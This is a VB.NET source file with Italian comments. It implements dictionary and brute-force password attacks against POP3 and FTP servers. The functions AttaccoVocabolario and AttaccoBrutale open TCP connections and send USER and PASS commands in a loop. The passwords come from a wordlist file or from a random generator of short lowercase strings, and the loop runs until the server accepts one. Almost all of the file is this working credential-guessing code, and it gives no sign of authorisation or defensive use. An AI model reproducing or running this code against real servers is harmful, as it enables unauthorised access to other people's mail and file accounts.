#Region "Author"
'Classe creata con DCFramework
'All rights reserved.
'Author: DC Consultilng srl
'Date: 14/07/2008
#End Region

Imports System.Net.Mail
Imports System.Data.OleDb
Imports System.IO


Friend Class cMail

    Private _Server As String
    Public Property Server() As String
        Get
            Return _Server
        End Get
        Set(ByVal value As String)
            _Server = value
        End Set
    End Property

    Private _Login As String
    Public Property Login() As String
        Get
            Return _Login
        End Get
        Set(ByVal value As String)
            _Login = value
        End Set
    End Property

    Private _Pwd As String
    Public Property Pwd() As String
        Get
            Return _Pwd
        End Get
        Set(ByVal value As String)
            _Pwd = value
        End Set
    End Property

    Private _porta As String
    Public Property Porta() As String
        Get
            Return _porta
        End Get
        Set(ByVal value As String)
            _porta = value
        End Set
    End Property

    Private _Password As String
    Public Property Password() As String
        Get
            Return _Password
        End Get
        Set(ByVal value As String)
            _Password = value
        End Set
    End Property





    Public Function AttaccoVocabolario(ByRef lblTent As Label, ByVal NomeFile As String) As Boolean

        Dim Ris As Boolean = False

        Dim fs As FileStream = New FileStream(NomeFile, FileMode.Open, FileAccess.Read)
        'declaring a FileStream to open the file named file.doc with access mode of reading
        Dim d As New StreamReader(fs)
        'creating a new StreamReader and passing the filestream object fs as argument
        d.BaseStream.Seek(0, SeekOrigin.Begin)
        'Seek method is used to move the cursor to different positions in a file, in this code, to
        'the beginning
        Dim BufferPwd As String = d.ReadToEnd()

        Dim ArPwd() As String = BufferPwd.Split(vbNewLine)

        d.Close()
        Dim I As Integer = 0, PwdTemp As String

        For I = 0 To ArPwd.Length - 1

            If (I Mod 10) = 0 Then

                lblTent.Text = I + 1
                Application.DoEvents()

            End If

            Try
                PwdTemp = ArPwd(I)
                PwdTemp = PwdTemp.TrimStart(Chr(10))
                Dim sckTcpClient As New Net.Sockets.TcpClient
                Dim sckStreamSocket As Net.Sockets.NetworkStream

                sckTcpClient.Connect(_Server, CInt(Porta))

                'passo al socket stream i valori dello stream tcp
                sckStreamSocket = sckTcpClient.GetStream()

                If ControllaRispServer(sckTcpClient, sckStreamSocket) = True Then
                    'qui sono collegato al server

                    'Codifico il comando in byte
                    Dim byteCommand As Byte() = System.Text.Encoding.ASCII.GetBytes("USER " & _Login + vbCrLf)
                    'Invio il comando al server
                    sckStreamSocket.Write(byteCommand, 0, byteCommand.Length)

                    If ControllaRispServer(sckTcpClient, sckStreamSocket) = True Then
                        'ok la user invio la password
                        byteCommand = System.Text.Encoding.ASCII.GetBytes("PASS " & PwdTemp + vbCrLf)
                        'Invio il comando al server
                        sckStreamSocket.Write(byteCommand, 0, byteCommand.Length)
                        If ControllaRispServer(sckTcpClient, sckStreamSocket) = True Then
                            'qui sono autenticato e  posso controllare le email
                            _Pwd = PwdTemp
                            Ris = True
                            Exit For

                        End If

                    End If

                End If
                sckStreamSocket.Close()
                sckStreamSocket = Nothing
                sckTcpClient.Close()
                sckTcpClient = Nothing

            Catch ex As Exception
                MessageBox.Show("S'e' verificato un errore: " & ex.Message, "", MessageBoxButtons.OK)
            End Try

        Next

        lblTent.Text = I + 1

        Return Ris

    End Function
    Public Function AttaccoBrutale(ByVal frmrif As Label, Optional ByVal cPassw As cPassword = Nothing) As Boolean

        Dim Ris As Boolean = False

        Dim I As Integer, PwdTemp As String = "a"
        Dim Password As cPassword

        If Not cPassw Is Nothing Then
            Password = cPassw
        Else
            Password = New cPassword
        End If
        Password.PasswordLung = 5
        I = Password.Count

        Dim sckTcpClient As Net.Sockets.TcpClient
        Dim sckStreamSocket As Net.Sockets.NetworkStream

        While Ris = False
            I += 1
            If (I Mod 50) = 0 Then

                frmrif.Text = Password.Count
                Application.DoEvents()

            End If

            Try
                PwdTemp = Password.NextPwd()
                PwdTemp = PwdTemp.TrimStart(Chr(10))

                sckTcpClient = New Net.Sockets.TcpClient
                sckTcpClient.Client.Connect(_Server, CInt(Porta))

                'passo al socket stream i valori dello stream tcp
                sckStreamSocket = sckTcpClient.GetStream()

                If ControllaRispServer(sckTcpClient, sckStreamSocket) = True Then
                    'qui sono collegato al server

                    'Codifico il comando in byte
                    Dim byteCommand As Byte() = System.Text.Encoding.ASCII.GetBytes("USER " & _Login + vbCrLf)
                    'Invio il comando al server
                    sckStreamSocket.Write(byteCommand, 0, byteCommand.Length)

                    If ControllaRispServer(sckTcpClient, sckStreamSocket) = True Then
                        'ok la user invio la password
                        byteCommand = System.Text.Encoding.ASCII.GetBytes("PASS " & PwdTemp + vbCrLf)
                        'Invio il comando al server
                        sckStreamSocket.Write(byteCommand, 0, byteCommand.Length)
                        If ControllaRispServer(sckTcpClient, sckStreamSocket) = True Then
                            'qui sono autenticato e  posso controllare le email
                            _Pwd = PwdTemp
                            Ris = True
                            '                            Exit While
                        End If
                    End If
                End If
                'sckStreamSocket.Close()
                'sckStreamSocket = Nothing
                sckTcpClient.Client.Disconnect(False)
                sckTcpClient = Nothing

            Catch ex As Exception

                If ex.Message.StartsWith("Di norma è consentito un solo utilizzo di ogni indirizzo di socket") Then
                    AttaccoBrutale(frmrif, Password)
                Else
                    MessageBox.Show("S'e' verificato un errore: " & ex.Message, "", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Exit While

                End If
            End Try

        End While



        Return Ris


    End Function
    Private Function ControllaRispServer(ByVal sckTcpClient As Net.Sockets.TcpClient, ByVal sckStreamSocket As Net.Sockets.NetworkStream) As Boolean
        Dim Ris As Boolean = False
        ' System.Threading.Thread.Sleep(100)

        Dim byteServer(sckTcpClient.ReceiveBufferSize) As Byte
        'leggo l'array di byte che mi restituisce il server
        sckStreamSocket.Read(byteServer, 0, byteServer.Length)
        'ricavo la stringa 
        Dim myString As String = System.Text.Encoding.ASCII.GetString(byteServer)

        'controllo le prime tre letter del messaggio
        'se con +OK l'operazione è stata eseguita con successo
        Select Case _porta
            Case "110"
                If myString.StartsWith("+OK") Then
                    Ris = True
                End If
            Case "21"
                If myString.StartsWith("530") = False Then
                    Ris = True
                End If

        End Select

        Return Ris

    End Function

End Class

Public Class cPassword
    Inherits CollectionBase

    Private _PasswordLung As Integer
    Public Property PasswordLung() As Integer
        Get
            Return _PasswordLung
        End Get
        Set(ByVal value As Integer)
            _PasswordLung = value
        End Set
    End Property

    Public Function NextPwd() As String

        Dim ris As Boolean = False
        Dim Pwd As String = ""

        While ris = False

            Dim x As New Random, Lung As Integer
            Lung = x.Next(1, _PasswordLung + 1)
            Pwd = ""
            Dim I As Integer

            Dim r As New Random

            For I = 1 To Lung

                Dim risult As Integer
                'risult = r.Next(33, 127)
                risult = r.Next(97, 123)
                Pwd &= Chr(risult)

            Next

            If InnerList.Contains(Pwd) = False Then
                InnerList.Add(Pwd)
                ris = True
                Application.DoEvents()
            End If

        End While

        Return Pwd

    End Function

End Class